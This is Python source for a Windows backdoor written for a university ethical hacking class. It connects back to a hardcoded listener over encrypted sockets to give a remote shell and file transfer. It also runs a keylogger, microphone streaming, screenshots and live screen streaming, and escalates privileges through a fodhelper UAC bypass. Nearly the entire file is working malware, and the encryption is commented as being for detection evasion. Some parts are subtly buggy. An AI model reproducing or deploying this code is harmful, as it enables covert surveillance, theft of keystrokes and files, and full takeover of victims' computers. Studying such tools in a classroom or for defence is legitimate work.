#################################################################################################
# Authors: Korn D., Krittanut Y., Sirapat T., Sarun P., Norraset S., Thanapat S., Siwanon T.    #
# Class: SIIT Ethical Hacking, 2023-2024                                                        #
#################################################################################################

# Import necessary Python modules
import socket  # For network communication
import threading
import time  # For adding delays
import subprocess  # For running shell commands
import json  # For encoding and decoding data in JSON format
import os  # For interacting with the operating system
import pyaudio
from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
import mss.tools
from pynput import keyboard  # For capturing keyboard input
import mss  # For taking screenshots
import base64  # For encoding and decoding data in base64 format
import io # For treating image bytes like a file in memory
from PIL import Image # To convert raw RGB data to JPEG for compression
import winreg  # For Windows registry manipulation
import sys  # For system-specific parameters and functions

# connection variables
lip = "192.168.210.1" # Listener IP address
# Pre-shared key for encryption
psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption

# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data *added*
    data_len = len(encrypted_data)
    s.sendall(data_len.to_bytes(4, 'big'))  # Send 4-byte length prefix
    s.sendall(encrypted_data)


# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data_len_bytes = s.recv(4)
    if not data_len_bytes:
        return None
    data_len = int.from_bytes(data_len_bytes, 'big')
    data = b''
    while len(data) < data_len:
        packet = s.recv(data_len - len(data))
        if not packet:
            return None
        data += packet
    decrypted_data = cipher.decrypt(data)
    return json.loads(decrypted_data.decode())


# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(5)  # Wait for 5 seconds before reconnecting (for resilience)
        try:
            # Connect to a remote host with Listener IP and port 5555
            s.connect((lip, 5555))
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            try:
                s.close()
                break
            except Exception as e:
                os._exit(0)  # Force exit if socket close fails
        except:
            # If a connection error occurs, retry the connection
            connection()


# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')  # Open the specified file in binary read mode
    s.send(f.read())  # Read and send the file's contents over the network


# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')  # Open a file for binary write mode
    s.settimeout(1)  # Set a timeout for receiving data
    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)  # Write the received data to the file
        try:
            chunk = s.recv(1024)  # Receive the next chunk
        except socket.timeout as e:
            break
    s.settimeout(None)  # Reset the timeout setting
    f.close()  # Close the file when done

log = ""
keylogger_running = False
t_start = time.time()  # Initialize the start time for the keylogger
def on_press(key):
    global log, t_start
    if not log:
        log += f"\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] "
    # if more than 20 seconds have passed since the last key press, add new line
    if time.time() - t_start > 20:
        log += f"\n[{time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())}] "
    try:
        # Append the pressed key to the log
        log += key.char
    except AttributeError:
        # Handle special keys (like Ctrl, Alt, etc.)
        if key == key.space:
            log += ' '
        elif key == key.enter:
            log += '\n'
        else:
            log += f'[{key}]'
    t_start = time.time()  # Update the start time after each key press

def start_keylogger():
    global keylogger_running
    keylogger_running = True

    def run():
        with keyboard.Listener(on_press=on_press) as listener:
            while keylogger_running:
                pass
            listener.stop()
    # Start the keylogger in a separate thread
    t = threading.Thread(target=run)
    t.daemon = True  # Set the thread as a daemon so it exits when the main program exits
    t.start()
    reliable_send("[+] Keylogger started.")

def stop_keylogger():
    global keylogger_running, log
    keylogger_running = False
    time.sleep(1)  # Give the keylogger some time to finish capturing keys
    # Clear the log when stopping the keylogger
    log = ""
    reliable_send("[+] Keylogger stopped.")

def retrieve_keylogger_log():
    global log
    log_data = log
    log = ""  # Clear the log after retrieving it
    reliable_send(log_data)

streaming_flag = {'on': False}
stream_thread = None

def start_audio_stream():
    global stream_thread, streaming_flag
    if not streaming_flag['on']:
        streaming_flag['on'] = True
        stream_thread = threading.Thread(target=stream_audio, args=(streaming_flag))
        stream_thread.daemon = True  # Set the thread as a daemon so it exits when the main program exits
        stream_thread.start()
        reliable_send("[+] Audio stream started.")
    else:
        reliable_send("[!] Audio stream is already running.")

def stop_audio_stream():
    global streaming_flag, stream_thread
    streaming_flag['on'] = False
    if stream_thread:
        stream_thread.join()  # Wait for the audio thread to finish
        stream_thread = None  # Reset the thread reference
    reliable_send("[+] Audio stream stopped.")

def stream_audio(sock, flag):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 11025

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS,
                    rate=RATE, input=True, frames_per_buffer=CHUNK)

    try:
        while flag['on']:
            data = stream.read(CHUNK)
            sock.sendall(data)
    except:
        pass
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()
        

# Function to take a screenshot and send it to the remote host
def take_screenshot():
    with mss.mss() as sct:
        # Capture the screen
        screenshot = sct.grab(sct.monitors[0])  # Capture full screen
        image_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)  # Convert to PNG format
        encoded_img = base64.b64encode(image_bytes).decode('utf-8')  # Encode the image in base64
    reliable_send(encoded_img)
    
# Function to start screen streaming
def start_screen_stream():
    try:
        screen_thread = threading.Thread(target=stream_screen)
        screen_thread.daemon = True
        screen_thread.start()
        reliable_send('[+] Screen streaming started.')
    except Exception as e:
        reliable_send(f'[-] Failed to start screen streaming: {str(e)}')

def stream_screen():
    try: # Runs in a separate thread and continuously sends screenshots to the server
        stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket.
        stream_socket.connect((lip, 9999)) # Connect to the attacker's machine on port 9999 for streaming.
        with mss.mss() as sct: # Open a screen capture session using mss
            while True: # Loop forever to take screenshots
                screenshots = sct.grab(sct.monitors[1]) # Take a screenshot of the main monitor.
                img = Image.frombytes('RGB', screenshots.size, screenshots.rgb) # Convert raw RGB data to a PIL image (we can't send raw RGB—it’s too large).
                buf = io.BytesIO() 
                img.save(buf, format='JPEG', quality=30) # Create an in-memory buffer and save the image as JPEG (compressed)
                data = buf.getvalue() # Convert the JPEG image to bytes.
                size = len(data).to_bytes(4, 'big')  # Prefix the image with a 4-byte size header (so the server knows how many bytes to read).
                stream_socket.sendall(size + data) # Send size + image together.
                time.sleep(0.5)  # adjust frame rate (2 FPS)
    except Exception as e:
        pass  # don’t crash if connection fails

# Privilege Escalation Functions: Run commmand with elevated privileges using fodhelper.exe
def fodhelper_escalate(command):
    try:
        # Registry key path that fodhelper.exe queries
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        # Create registry structure
        try:
            # Create the registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            # Set the default value to the command we want to run with elevated privileges
            winreg.SetValue(key, "", winreg.REG_SZ, command)
            # Create DelegateExecute value (needs to exist but be empty)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)    
            
            # Execute fodhelper.exe - it will run our command with elevated privileges
            # Using subprocess to start fodhelper silently
            subprocess.Popen(["C:\\Windows\\System32\\fodhelper.exe"], 
                            shell=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
            # Wait a moment for fodhelper to execute
            time.sleep(2)
            # Clean up - remove the registry key
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path + r"\command")
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path + r"\Shell\Open")
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path + r"\Shell")
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass  # Cleanup errors are not critical  
            return True
        except Exception as e:
            return False
    except Exception as e:
        return False

# Privilege Escalation Functions: Spawn a new elevated shell 
def spawn_elevated_shell():
    try:
        # Path to the current Python executable and script
        python_path = sys.executable
        script_path = os.path.abspath(__file__)
        # Command to run another instance of this backdoor with elevated privileges
        # Using pythonw.exe if available to run without window
        if os.path.exists(python_path.replace('python.exe', 'pythonw.exe')):
            python_cmd = python_path.replace('python.exe', 'pythonw.exe')
        else:
            python_cmd = python_path
        # Build the command to run the backdoor elevated
        elevated_cmd = f'"{python_cmd}" "{script_path}"'
        # Use fodhelper to execute the command with elevated privileges
        return fodhelper_escalate(elevated_cmd)
    except Exception as e:
        return False

# Main shell function for command execution
def shell():
    while True:
        # Receive a command from the remote host
        command = reliable_recv()
        if command == 'quit':
            # If the command is 'quit', exit the shell loop
            try:
                break
            except Exception as e:
                os._exit(0)  # Force exit if socket close fails
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command == 'keylogger_start':
            start_keylogger()
        elif command == 'keylogger_stop':
            stop_keylogger()
        elif command == 'keylogger_dump':
            retrieve_keylogger_log()
        elif command == 'listening_start':
            start_audio_stream()
        elif command == 'listening_stop':
            stop_audio_stream()
        elif command == 'screenshot':
            take_screenshot()
        elif command == 'screen_stream':
            start_screen_stream()
        elif command == 'elevate':
            # Attempt to escalate privileges using fodhelper UAC bypass
            result = spawn_elevated_shell()
            if result:
                reliable_send("[+] Privilege escalation initiated. New elevated shell should connect shortly.")
            else:
                reliable_send("[-] Privilege escalation failed.")
        else:
            try:
                # For other commands, execute them using subprocess
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
                result = result.decode()  # Decode the output to a string
                # Send the command execution result back to the remote host
                reliable_send(result)
            except Exception as e:
                # If an error occurs during command execution, send the error message
                reliable_send(str(e))


# Create a socket object for communication over IPv4 and TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process by calling the connection() function
connection()